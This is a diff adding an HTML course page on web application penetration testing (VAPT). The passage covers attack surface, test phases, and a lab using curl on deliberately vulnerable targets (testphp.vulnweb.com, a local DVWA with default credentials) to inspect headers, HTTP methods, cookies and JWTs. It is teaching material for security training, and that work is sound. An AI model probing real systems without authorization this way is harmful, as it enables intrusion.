@@ -1,0 +1,2584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web App Security & VAPT — Study Module</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:        #080b10;
+  --bg2:       #0c1018;
+  --bg3:       #101520;
+  --bg4:       #151c28;
+  --surface:   #0d1219;
+  --border:    #1a2235;
+  --border2:   #243048;
+  --text:      #dce8f0;
+  --text-muted:#7a92a8;
+  --text-dim:  #334455;
+  --magenta:   #e040fb;
+  --mag-dim:   #4a0a5a;
+  --mag-glow:  rgba(224,64,251,0.08);
+  --cyan:      #00e5ff;
+  --cyan-dim:  #003a48;
+  --cyan-glow: rgba(0,229,255,0.07);
+  --lime:      #76ff03;
+  --lime-dim:  #1a3a00;
+  --lime-glow: rgba(118,255,3,0.07);
+  --amber:     #ffab40;
+  --amber-dim: #3d2200;
+  --red:       #ff5252;
+  --red-dim:   #3d0a0a;
+  --blue:      #448aff;
+  --blue-dim:  #0a1a3d;
+  --sidebar-w: 256px;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+
+body{
+  font-family:'Roboto Mono',monospace;
+  background:var(--bg);
+  color:var(--text);
+  font-size:13px;
+  line-height:1.75;
+  min-height:100vh;
+}
+
+/* circuit board grid background */
+body::before{
+  content:'';
+  position:fixed;top:0;left:0;right:0;bottom:0;
+  background-image:
+    linear-gradient(rgba(0,229,255,0.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,229,255,0.025) 1px,transparent 1px),
+    linear-gradient(rgba(224,64,251,0.015) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(224,64,251,0.015) 1px,transparent 1px);
+  background-size:80px 80px, 80px 80px, 20px 20px, 20px 20px;
+  pointer-events:none;z-index:0;
+}
+
+.layout{display:flex;min-height:100vh;position:relative;z-index:1;}
+
+/* ── SIDEBAR ── */
+.sidebar{
+  width:var(--sidebar-w);flex-shrink:0;
+  background:var(--bg2);
+  border-right:1px solid var(--border);
+  position:sticky;top:0;height:100vh;
+  overflow-y:auto;display:flex;flex-direction:column;
+}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--mag-dim);}
+
+.sb-head{
+  padding:22px 18px 16px;
+  border-bottom:1px solid var(--border);
+  position:relative;
+}
+.sb-head::after{
+  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,var(--magenta),var(--cyan),transparent);
+  opacity:0.5;
+}
+
+.sb-chip{
+  display:inline-flex;align-items:center;gap:5px;
+  background:var(--mag-glow);border:1px solid var(--mag-dim);
+  border-radius:2px;padding:2px 8px;
+  font-size:8.5px;letter-spacing:0.1em;text-transform:uppercase;
+  color:var(--magenta);margin-bottom:10px;
+}
+.sb-chip::before{
+  content:'';width:5px;height:5px;border-radius:50%;
+  background:var(--magenta);box-shadow:0 0 6px var(--magenta);
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.3;}}
+
+.sb-title{
+  font-family:'Rajdhani',sans-serif;
+  font-size:18px;font-weight:700;letter-spacing:0.06em;
+  color:var(--text);line-height:1.2;text-transform:uppercase;
+}
+.sb-title span{color:var(--cyan);}
+.sb-sub{font-size:9px;color:var(--text-dim);margin-top:5px;letter-spacing:0.06em;}
+
+.nav-grp{
+  padding:13px 18px 3px;
+  font-size:8.5px;letter-spacing:0.12em;text-transform:uppercase;
+  color:var(--text-dim);
+}
+
+.nav-item{
+  display:flex;align-items:center;gap:9px;
+  padding:7px 18px;
+  font-size:11px;color:var(--text-muted);
+  cursor:pointer;transition:all 0.12s;
+  text-decoration:none;
+  border-left:2px solid transparent;
+}
+.nav-item:hover{color:var(--text);background:var(--bg3);}
+.nav-item.active{color:var(--cyan);background:var(--cyan-glow);border-left-color:var(--cyan);}
+
+.nav-n{font-size:9px;color:var(--text-dim);min-width:18px;text-align:right;}
+
+.sb-foot{
+  margin-top:auto;padding:14px 18px;
+  border-top:1px solid var(--border);
+}
+.sf-row{display:flex;justify-content:space-between;font-size:9.5px;color:var(--text-dim);margin-bottom:6px;}
+.sf-track{height:2px;background:var(--border);border-radius:99px;overflow:hidden;}
+.sf-fill{height:100%;background:linear-gradient(90deg,var(--magenta),var(--cyan));border-radius:99px;transition:width 0.5s;}
+
+/* ── MAIN ── */
+.main{flex:1;overflow-x:hidden;}
+
+/* Hero */
+.hero{
+  padding:52px 64px 42px;
+  border-bottom:1px solid var(--border);
+  background:var(--bg);
+  position:relative;overflow:hidden;
+}
+
+.hero::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--magenta),var(--cyan),transparent);
+}
+
+.hero::after{
+  content:'VAPT';
+  position:absolute;right:40px;top:50%;transform:translateY(-50%);
+  font-family:'Rajdhani',sans-serif;
+  font-size:200px;font-weight:700;letter-spacing:-8px;
+  background:linear-gradient(135deg,rgba(224,64,251,0.04),rgba(0,229,255,0.04));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  pointer-events:none;user-select:none;
+}
+
+.hero-label{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:10px;letter-spacing:0.14em;text-transform:uppercase;
+  color:var(--magenta);margin-bottom:14px;
+}
+.hero-label::before{content:'//';color:var(--text-dim);}
+
+.hero-title{
+  font-family:'Rajdhani',sans-serif;
+  font-size:62px;font-weight:700;letter-spacing:0.04em;text-transform:uppercase;
+  line-height:0.92;margin-bottom:16px;
+}
+.hero-title .t1{color:var(--text);}
+.hero-title .t2{
+  color:transparent;
+  -webkit-text-stroke:1px var(--cyan);
+  text-shadow:0 0 30px rgba(0,229,255,0.3);
+}
+
+.hero-warning{
+  display:inline-flex;align-items:flex-start;gap:10px;
+  background:rgba(255,82,82,0.06);
+  border:1px solid var(--red-dim);
+  border-left:3px solid var(--red);
+  border-radius:2px;padding:10px 14px;
+  font-size:11.5px;color:var(--text-muted);
+  max-width:640px;margin-bottom:24px;line-height:1.7;
+}
+.hw-icon{color:var(--red);flex-shrink:0;margin-top:1px;}
+
+.hero-stats{
+  display:inline-flex;border:1px solid var(--border);
+  border-radius:2px;overflow:hidden;
+}
+.hs{
+  padding:11px 20px;border-right:1px solid var(--border);
+  display:flex;flex-direction:column;gap:2px;
+}
+.hs:last-child{border-right:none;}
+.hs-v{
+  font-family:'Rajdhani',sans-serif;
+  font-size:22px;font-weight:700;letter-spacing:0.06em;color:var(--text);
+}
+.hs-v.m{color:var(--magenta);}
+.hs-v.c{color:var(--cyan);}
+.hs-v.l{color:var(--lime);}
+.hs-l{font-size:9px;color:var(--text-dim);letter-spacing:0.07em;text-transform:uppercase;}
+
+/* Content */
+.content{padding:0 64px 80px;}
+
+/* Section */
+.section{margin-top:52px;animation:slideUp 0.3s ease both;}
+@keyframes slideUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+
+.sec-head{
+  display:flex;align-items:flex-start;gap:16px;
+  margin-bottom:24px;padding-bottom:16px;
+  border-bottom:1px solid var(--border);position:relative;
+}
+.sec-head::after{
+  content:'';position:absolute;bottom:-1px;left:0;
+  width:42px;height:1px;background:var(--magenta);
+  box-shadow:0 0 8px rgba(224,64,251,0.5);
+}
+
+.sec-num{
+  font-family:'Rajdhani',sans-serif;
+  font-size:13px;font-weight:700;color:var(--text-dim);
+  letter-spacing:0.08em;padding-top:3px;min-width:22px;
+}
+.sec-meta{flex:1;}
+.sec-title{
+  font-family:'Rajdhani',sans-serif;
+  font-size:26px;font-weight:700;letter-spacing:0.06em;
+  text-transform:uppercase;color:var(--text);
+  line-height:1.1;margin-bottom:3px;
+}
+.sec-sub{font-size:10.5px;color:var(--text-muted);}
+
+.badge{
+  font-size:8.5px;font-weight:500;letter-spacing:0.1em;
+  text-transform:uppercase;padding:3px 10px;
+  border-radius:2px;flex-shrink:0;margin-top:4px;border:1px solid;
+}
+.b-mag{background:var(--mag-glow);color:var(--magenta);border-color:var(--mag-dim);}
+.b-cyan{background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);}
+.b-lime{background:var(--lime-glow);color:var(--lime);border-color:var(--lime-dim);}
+.b-amber{background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);}
+.b-red{background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);}
+.b-blue{background:var(--blue-dim);color:var(--blue);border-color:rgba(68,138,255,0.2);}
+
+/* Theory */
+.theory{
+  background:var(--bg2);border:1px solid var(--border);
+  border-left:2px solid var(--magenta);
+  border-radius:2px;padding:16px 20px;margin-bottom:12px;
+}
+.theory.cyan{border-left-color:var(--cyan);}
+.theory.lime{border-left-color:var(--lime);}
+.theory.amber{border-left-color:var(--amber);}
+.theory.red{border-left-color:var(--red);}
+.theory.blue{border-left-color:var(--blue);}
+
+.theory h4{
+  font-family:'Rajdhani',sans-serif;
+  font-size:15px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;
+  color:var(--magenta);margin-bottom:8px;
+}
+.theory.cyan h4{color:var(--cyan);}
+.theory.lime h4{color:var(--lime);}
+.theory.amber h4{color:var(--amber);}
+.theory.red h4{color:var(--red);}
+.theory.blue h4{color:var(--blue);}
+
+.theory p{font-size:12.5px;color:var(--text-muted);margin-bottom:7px;line-height:1.82;}
+.theory p:last-child{margin-bottom:0;}
+.theory strong{color:var(--text);font-weight:500;}
+.theory em{color:var(--cyan);font-style:normal;}
+
+/* Grid */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(210px,1fr));
+  gap:7px;margin:10px 0;
+}
+.card{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:2px;padding:13px 15px;
+  transition:all 0.12s;
+}
+.card:hover{border-color:var(--border2);background:var(--bg3);}
+
+.ck{
+  font-size:9.5px;font-weight:500;letter-spacing:0.07em;
+  text-transform:uppercase;margin-bottom:6px;color:var(--magenta);
+}
+.ck.c{color:var(--cyan);}
+.ck.l{color:var(--lime);}
+.ck.a{color:var(--amber);}
+.ck.r{color:var(--red);}
+.ck.b{color:var(--blue);}
+.cv{font-size:12px;color:var(--text-muted);line-height:1.68;}
+
+/* Table */
+.dtable{width:100%;border-collapse:collapse;margin:12px 0;font-size:12px;}
+.dtable th{
+  text-align:left;padding:9px 12px;
+  background:var(--bg3);color:var(--cyan);
+  font-size:8.5px;text-transform:uppercase;letter-spacing:0.1em;font-weight:500;
+  border-bottom:1px solid var(--border);
+}
+.dtable td{
+  padding:9px 12px;border-bottom:1px solid var(--border);
+  color:var(--text-muted);vertical-align:top;
+}
+.dtable tr:last-child td{border-bottom:none;}
+.dtable tr:hover td{background:var(--bg3);color:var(--text);}
+.dtable tbody tr:nth-child(even) td{background:var(--bg2);}
+
+.tm{color:var(--magenta);font-weight:500;}
+.tc{color:var(--cyan);font-weight:500;}
+.tl{color:var(--lime);font-weight:500;}
+.ta{color:var(--amber);font-weight:500;}
+.tr-{color:var(--red);font-weight:500;}
+.tb{color:var(--blue);font-weight:500;}
+
+/* Practical */
+.practical{
+  border:1px solid var(--border);border-radius:2px;
+  overflow:hidden;margin-bottom:12px;background:var(--bg2);
+}
+.prac-head{
+  background:var(--bg3);padding:11px 16px;
+  display:flex;align-items:center;gap:10px;
+  border-bottom:1px solid var(--border);
+  cursor:pointer;user-select:none;transition:background 0.12s;
+}
+.prac-head:hover{background:rgba(0,229,255,0.04);}
+
+.ph-i{font-size:14px;}
+.ph-t{
+  font-family:'Rajdhani',sans-serif;
+  font-size:14px;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;
+  color:var(--text);flex:1;
+}
+.ph-tag{
+  font-size:8.5px;font-weight:500;text-transform:uppercase;
+  letter-spacing:0.09em;padding:2px 8px;border-radius:2px;border:1px solid;
+}
+.pt-lab{background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);}
+.pt-cmd{background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);}
+.pt-tool{background:var(--mag-glow);color:var(--magenta);border-color:var(--mag-dim);}
+.pt-report{background:var(--lime-glow);color:var(--lime);border-color:var(--lime-dim);}
+.pt-concept{background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);}
+
+.ph-chev{font-size:9px;color:var(--text-dim);transition:transform 0.2s;}
+.practical.open .ph-chev{transform:rotate(90deg);}
+.prac-body{display:none;padding:16px 20px;}
+.practical.open .prac-body{display:block;}
+
+/* Steps */
+.steps{list-style:none;}
+.step{display:flex;gap:14px;margin-bottom:16px;padding-bottom:16px;border-bottom:1px dashed var(--border);}
+.step:last-child{margin-bottom:0;padding-bottom:0;border-bottom:none;}
+.sn{
+  width:22px;height:22px;border-radius:2px;
+  background:var(--mag-glow);border:1px solid var(--mag-dim);
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Rajdhani',sans-serif;
+  font-size:11px;font-weight:700;color:var(--magenta);
+  flex-shrink:0;margin-top:1px;
+}
+.sc{flex:1;}
+.st{
+  font-family:'Rajdhani',sans-serif;
+  font-size:14px;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;
+  color:var(--text);margin-bottom:4px;
+}
+.sd{font-size:12px;color:var(--text-muted);line-height:1.8;margin-bottom:7px;}
+.sd:last-child{margin-bottom:0;}
+
+/* Code */
+.code{
+  background:#020406;
+  border:1px solid var(--border);
+  border-left:2px solid var(--mag-dim);
+  border-radius:2px;padding:13px 16px;
+  font-size:11.5px;color:#5a7a8a;
+  overflow-x:auto;margin:7px 0;
+  position:relative;line-height:1.82;
+}
+.code .cm{color:#1e2a35;}
+.code .cmd{color:var(--lime);}
+.code .flag{color:var(--amber);}
+.code .val{color:var(--cyan);}
+.code .kw{color:var(--magenta);}
+.code .hi{color:var(--red);}
+.code .ok{color:var(--lime);}
+.code .warn{color:var(--amber);}
+.code .out{color:#2a3d4d;font-style:italic;}
+.code .str{color:#5db8d0;}
+.code::before{
+  content:attr(data-label);
+  position:absolute;top:6px;right:10px;
+  font-size:8.5px;color:var(--text-dim);
+  letter-spacing:0.08em;text-transform:uppercase;
+}
+
+/* Notes */
+.note{
+  display:flex;gap:10px;align-items:flex-start;
+  border-radius:2px;padding:10px 14px;
+  font-size:12px;margin:8px 0;line-height:1.78;
+}
+.note.mag{background:var(--mag-glow);border:1px solid var(--mag-dim);color:var(--text-muted);}
+.note.cyan{background:var(--cyan-glow);border:1px solid var(--cyan-dim);color:var(--text-muted);}
+.note.lime{background:var(--lime-glow);border:1px solid var(--lime-dim);color:var(--text-muted);}
+.note.amber{background:var(--amber-dim);border:1px solid rgba(255,171,64,0.15);color:var(--text-muted);}
+.note.red{background:var(--red-dim);border:1px solid rgba(255,82,82,0.15);color:var(--text-muted);}
+.note .ni{font-size:13px;flex-shrink:0;margin-top:1px;}
+.note strong{color:var(--text);}
+
+/* Divider */
+.hdiv{border:none;border-top:1px solid var(--border);margin:42px 0 0;}
+
+/* OWASP rank item */
+.owasp-item{
+  display:flex;align-items:flex-start;gap:14px;
+  padding:12px 14px;
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:2px;margin-bottom:6px;
+  transition:all 0.12s;
+}
+.owasp-item:hover{border-color:var(--border2);background:var(--bg3);}
+.oi-rank{
+  font-family:'Rajdhani',sans-serif;
+  font-size:24px;font-weight:700;
+  min-width:44px;text-align:center;
+  line-height:1;padding-top:2px;
+  opacity:0.6;
+}
+.oi-body{flex:1;}
+.oi-name{
+  font-family:'Rajdhani',sans-serif;
+  font-size:15px;font-weight:700;letter-spacing:0.04em;text-transform:uppercase;
+  color:var(--text);margin-bottom:4px;
+}
+.oi-desc{font-size:12px;color:var(--text-muted);line-height:1.7;margin-bottom:6px;}
+.oi-tags{display:flex;gap:5px;flex-wrap:wrap;}
+.oi-tag{
+  font-size:9px;padding:2px 7px;border-radius:2px;
+  border:1px solid;letter-spacing:0.06em;text-transform:uppercase;
+}
+
+/* Checklist */
+.checklist{list-style:none;}
+.checklist li{
+  display:flex;align-items:flex-start;gap:10px;
+  padding:5px 8px;border-radius:2px;
+  font-size:12px;color:var(--text-muted);cursor:pointer;transition:background 0.1s;
+}
+.checklist li:hover{background:var(--bg3);color:var(--text);}
+.cb{
+  width:13px;height:13px;border:1px solid var(--border2);
+  border-radius:1px;flex-shrink:0;margin-top:3px;
+  display:flex;align-items:center;justify-content:center;transition:all 0.14s;
+}
+.checklist li.done .cb{background:var(--lime);border-color:var(--lime);}
+.checklist li.done .cb::after{content:'✓';font-size:8.5px;color:#000;font-weight:bold;}
+.checklist li.done span:last-child{text-decoration:line-through;color:var(--text-dim);}
+
+/* Burp flow */
+.burp-flow{
+  display:flex;gap:0;border:1px solid var(--border);
+  border-radius:2px;overflow:hidden;margin:12px 0;
+}
+.bf-step{
+  flex:1;padding:12px 12px 10px;background:var(--bg2);
+  border-right:1px solid var(--border);
+}
+.bf-step:last-child{border-right:none;}
+.bf-step.active{background:var(--mag-glow);border-right-color:var(--mag-dim);}
+.bf-n{font-size:9px;color:var(--text-dim);margin-bottom:3px;letter-spacing:0.06em;}
+.bf-t{
+  font-family:'Rajdhani',sans-serif;
+  font-size:13px;font-weight:700;letter-spacing:0.04em;color:var(--text);margin-bottom:3px;
+}
+.bf-d{font-size:10.5px;color:var(--text-muted);line-height:1.5;}
+
+/* scrollbar */
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+
+@media(max-width:900px){
+  .sidebar{display:none;}
+  .hero,.content{padding-left:20px;padding-right:20px;}
+  .hero-title{font-size:44px;}
+  .hero::after{display:none;}
+  .grid{grid-template-columns:1fr 1fr;}
+  .burp-flow{flex-direction:column;}
+  .bf-step{border-right:none;border-bottom:1px solid var(--border);}
+  .bf-step:last-child{border-bottom:none;}
+}
+</style>
+</head>
+<body>
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sb-head">
+    <div class="sb-chip">Module 04</div>
+    <div class="sb-title">WEB APP<br><span>SECURITY</span></div>
+    <div class="sb-sub">VAPT · Week 4–5 · OWASP Track</div>
+  </div>
+
+  <div class="nav-grp">Foundation</div>
+  <a class="nav-item active" href="#s1"><span class="nav-n">01</span>Web App Architecture</a>
+  <a class="nav-item" href="#s2"><span class="nav-n">02</span>HTTP Deep Dive</a>
+  <a class="nav-item" href="#s3"><span class="nav-n">03</span>OWASP Top 10 Overview</a>
+
+  <div class="nav-grp">OWASP Top 10 Labs</div>
+  <a class="nav-item" href="#s4"><span class="nav-n">04</span>A01 Broken Access Control</a>
+  <a class="nav-item" href="#s5"><span class="nav-n">05</span>A03 Injection (SQLi)</a>
+  <a class="nav-item" href="#s6"><span class="nav-n">06</span>A07 XSS</a>
+  <a class="nav-item" href="#s7"><span class="nav-n">07</span>A02 Cryptographic Failures</a>
+  <a class="nav-item" href="#s8"><span class="nav-n">08</span>A05 Security Misconfiguration</a>
+  <a class="nav-item" href="#s9"><span class="nav-n">09</span>A08 Insecure Deserialization</a>
+  <a class="nav-item" href="#s10"><span class="nav-n">10</span>A09 Outdated Components</a>
+
+  <div class="nav-grp">Testing Tools</div>
+  <a class="nav-item" href="#s11"><span class="nav-n">11</span>Burp Suite Mastery</a>
+  <a class="nav-item" href="#s12"><span class="nav-n">12</span>sqlmap Automation</a>
+  <a class="nav-item" href="#s13"><span class="nav-n">13</span>API Security Testing</a>
+  <a class="nav-item" href="#s14"><span class="nav-n">14</span>Authentication Attacks</a>
+
+  <div class="nav-grp">Reporting</div>
+  <a class="nav-item" href="#s15"><span class="nav-n">15</span>VAPT Methodology</a>
+  <a class="nav-item" href="#s16"><span class="nav-n">16</span>Report Writing — Capstone</a>
+
+  <div class="sb-foot">
+    <div class="sf-row"><span>Progress</span><span id="sb-pct">0%</span></div>
+    <div class="sf-track"><div class="sf-fill" id="sb-fill" style="width:0%"></div></div>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+<div class="hero">
+  <div class="hero-label">Module 04 · CEH + OWASP Track</div>
+  <h1 class="hero-title">
+    <span class="t1">WEB APP<br></span>
+    <span class="t2">SECURITY & VAPT</span>
+  </h1>
+
+  <div class="hero-warning">
+    <span class="hw-icon">⚠</span>
+    <span><strong>Authorized testing only.</strong> All labs in this module target DVWA, Juice Shop, WebGoat, or systems you own. Unauthorized web application testing is illegal under IT Act 2000 Section 66 and equivalent laws globally. Always obtain written authorization (Rules of Engagement) before testing any system.</span>
+  </div>
+
+  <div class="hero-stats">
+    <div class="hs"><span class="hs-v">16</span><span class="hs-l">Topics</span></div>
+    <div class="hs"><span class="hs-v m">14+</span><span class="hs-l">Labs</span></div>
+    <div class="hs"><span class="hs-v c">OWASP Top 10</span><span class="hs-l">Full Coverage</span></div>
+    <div class="hs"><span class="hs-v l">DVWA · Burp</span><span class="hs-l">Core Tools</span></div>
+  </div>
+</div>
+
+<div class="content">
+
+<!-- ══════════════════
+01 — Web App Architecture
+══════════════════ -->
+<div class="section" id="s1">
+  <div class="sec-head">
+    <span class="sec-num">01</span>
+    <div class="sec-meta">
+      <div class="sec-title">Web App Architecture & Attack Surface</div>
+      <div class="sec-sub">Client–server model, 3-tier architecture, and where vulnerabilities live</div>
+    </div>
+    <span class="badge b-cyan">Foundation</span>
+  </div>
+
+  <div class="theory cyan">
+    <h4>Understanding the Target Before Testing</h4>
+    <p>A web application security assessment starts with understanding how the target is built. Every architectural decision — which framework, which database, which cloud provider, which third-party libraries — creates potential vulnerabilities. A tester who understands the architecture finds vulnerabilities faster and more completely than one who blindly runs scanners.</p>
+    <p>Modern web applications typically have a <em>3-tier architecture</em>: <strong>Presentation tier</strong> (browser, mobile app — what the user sees), <strong>Application tier</strong> (web server, API, business logic — where most vulnerabilities live), and <strong>Data tier</strong> (database, file storage, caches — highest value target). Security must exist at every tier.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="ck c">Browser (Client)</div>
+      <div class="cv">Renders HTML/CSS/JS. Executes JavaScript. Stores cookies, localStorage, sessionStorage. Attack surface: XSS, CSRF, client-side storage of secrets, CSP bypass, clickjacking.</div>
+    </div>
+    <div class="card">
+      <div class="ck">Web Server</div>
+      <div class="cv">Serves static files and routes requests. Nginx, Apache, IIS. Attack surface: misconfigurations, directory traversal, server info disclosure, outdated server software.</div>
+    </div>
+    <div class="card">
+      <div class="ck l">Application Layer</div>
+      <div class="cv">Business logic (PHP, Python, Node.js, Java). Processes user input. Attack surface: SQL injection, command injection, authentication bypass, IDOR, business logic flaws.</div>
+    </div>
+    <div class="card">
+      <div class="ck a">Database</div>
+      <div class="cv">MySQL, PostgreSQL, MongoDB, Redis. Stores sensitive data. Attack surface: SQL injection, NoSQL injection, default credentials, exposed management interfaces (phpMyAdmin).</div>
+    </div>
+    <div class="card">
+      <div class="ck r">APIs & Microservices</div>
+      <div class="cv">REST, GraphQL, SOAP. Modern apps expose APIs that mobile and JS frontends call. OWASP API Top 10 covers this. Attack surface: auth bypass, mass assignment, rate-limit absence.</div>
+    </div>
+    <div class="card">
+      <div class="ck b">CDN / Third Parties</div>
+      <div class="cv">Cloudflare, AWS CloudFront, third-party scripts (analytics, ads, payments). Attack surface: supply chain attacks, subresource integrity bypass, data leakage to third parties.</div>
+    </div>
+  </div>
+
+  <div class="theory amber" style="margin-top:14px;">
+    <h4>The VAPT Methodology — Four Phases</h4>
+    <p><strong>Phase 1 — Reconnaissance:</strong> Understand the target without touching it. Technology stack (Wappalyzer), directory structure (robots.txt, sitemap.xml), login pages, API endpoints, JavaScript source code, error messages, external links.</p>
+    <p><strong>Phase 2 — Scanning & Enumeration:</strong> Actively probe the application. Directory/file brute force (gobuster, ffuf), parameter discovery, authentication mechanism identification, session management analysis, input field mapping.</p>
+    <p><strong>Phase 3 — Exploitation:</strong> Attempt to exploit identified vulnerabilities. Controlled, documented, within scope. The findings here form the body of your report.</p>
+    <p><strong>Phase 4 — Reporting:</strong> Document findings with evidence (screenshots, HTTP requests/responses), CVSS scores, business impact, and remediation steps. The deliverable that clients pay for.</p>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+02 — HTTP Deep Dive
+══════════════════ -->
+<div class="section" id="s2">
+  <div class="sec-head">
+    <span class="sec-num">02</span>
+    <div class="sec-meta">
+      <div class="sec-title">HTTP — The Language of Web Security</div>
+      <div class="sec-sub">Methods, status codes, headers, cookies, sessions — every security-relevant detail</div>
+    </div>
+    <span class="badge b-cyan">Protocol</span>
+  </div>
+
+  <div class="theory cyan">
+    <h4>HTTP Is the Attack Surface</h4>
+    <p>HTTP (HyperText Transfer Protocol) is the foundation of web communication — and therefore the foundation of web application attacks. Every vulnerability in this module is exploited via HTTP. Understanding HTTP at the raw header level — not just through a browser — is what separates a skilled web tester from someone who just clicks buttons.</p>
+    <p>In Burp Suite, you'll see and modify raw HTTP. Understanding every field — method, path, Host, Content-Type, Cookie, Authorization, response codes, security headers — is essential to effectively test and find vulnerabilities.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔬</span>
+      <span class="ph-t">Lab 2.1 — Dissect HTTP requests and security headers with curl and Burp</span>
+      <span class="ph-tag pt-cmd">HTTP Analysis</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Inspect raw HTTP with curl</div>
+            <div class="code" data-label="bash">
+<span class="cm"># See full request and response headers</span>
+<span class="cmd">curl</span> <span class="flag">-v</span> http://testphp.vulnweb.com/
+<span class="cm"># -v (verbose) shows: request headers sent → response headers received</span>
+
+<span class="cm"># Inspect security headers specifically</span>
+<span class="cmd">curl</span> <span class="flag">-I</span> https://google.com
+<span class="cm"># -I: HEAD request — response headers only</span>
+<span class="cm"># Look for: X-Frame-Options, Strict-Transport-Security, Content-Security-Policy</span>
+<span class="cm"># X-Content-Type-Options, Referrer-Policy, Permissions-Policy</span>
+
+<span class="cm"># Check what HTTP methods are allowed (OPTIONS request)</span>
+<span class="cmd">curl</span> <span class="flag">-X OPTIONS -v</span> http://testphp.vulnweb.com/
+<span class="cm"># If TRACE is allowed → cross-site tracing (XST) risk</span>
+<span class="cm"># If DELETE/PUT are allowed on app endpoints → check auth!</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Identify missing security headers (finding in VAPT report)</div>
+            <div class="code" data-label="bash">
+<span class="cmd">curl</span> <span class="flag">-sI</span> http://testphp.vulnweb.com/ | <span class="cmd">grep</span> <span class="flag">-iE</span> \
+  <span class="val">"x-frame|strict-transport|content-security|x-content-type|referrer"</span>
+
+<span class="cm"># Missing headers are a finding! Document each:</span>
+<span class="cm"># X-Frame-Options: DENY → prevents clickjacking</span>
+<span class="cm"># Strict-Transport-Security → forces HTTPS</span>
+<span class="cm"># Content-Security-Policy → prevents XSS via script-src restrictions</span>
+<span class="cm"># X-Content-Type-Options: nosniff → prevents MIME-type sniffing</span>
+<span class="cm"># Referrer-Policy → controls referrer header leakage</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Cookie security flags — test and document</div>
+            <div class="code" data-label="bash + python3">
+<span class="cm"># Login to DVWA and capture the Set-Cookie header</span>
+<span class="cmd">curl</span> <span class="flag">-v -c cookies.txt -b cookies.txt -X POST</span> \
+  http://localhost:8080/dvwa/login.php \
+  <span class="flag">-d</span> <span class="val">"username=admin&password=password&Login=Login"</span> 2>&1 | \
+  <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"set-cookie"</span>
+
+<span class="cm"># Good cookie: HttpOnly; Secure; SameSite=Strict; Path=/</span>
+<span class="cm"># Bad cookie (DVWA defaults): just PHPSESSID=value (no flags!)</span>
+
+<span class="cm"># Python: decode a JWT token to inspect claims</span>
+<span class="cmd">python3</span> <span class="flag">-c</span> <span class="val">"
+import base64, json
+token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.sig'
+h, p, s = token.split('.')
+payload = json.loads(base64.b64decode(p + '==').decode())
+print(json.dumps(payload, indent=2))
+"</span>
+<span class="cm"># Decoded payload shows: user ID, role, expiry — check for sensitive data</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <table class="dtable">
+    <thead><tr><th>Security Header</th><th>What It Prevents</th><th>Recommended Value</th><th>Finding Severity if Missing</th></tr></thead>
+    <tbody>
+      <tr><td class="tm">Content-Security-Policy</td><td>XSS by restricting script sources and inline execution</td><td><code style="color:var(--cyan)">default-src 'self'; script-src 'self'; object-src 'none'</code></td><td class="tr-">HIGH — enables XSS attacks</td></tr>
+      <tr><td class="tm">X-Frame-Options</td><td>Clickjacking — embedding in an iframe to trick clicks</td><td><code style="color:var(--cyan)">DENY</code> or <code style="color:var(--cyan)">SAMEORIGIN</code></td><td class="ta">MEDIUM — clickjacking possible</td></tr>
+      <tr><td class="tm">Strict-Transport-Security</td><td>SSL stripping and accidental HTTP access</td><td><code style="color:var(--cyan)">max-age=31536000; includeSubDomains; preload</code></td><td class="ta">MEDIUM — MITM / SSL strip</td></tr>
+      <tr><td class="tm">X-Content-Type-Options</td><td>MIME sniffing attacks — browser executing wrong content type</td><td><code style="color:var(--cyan)">nosniff</code></td><td class="tb">LOW–MEDIUM</td></tr>
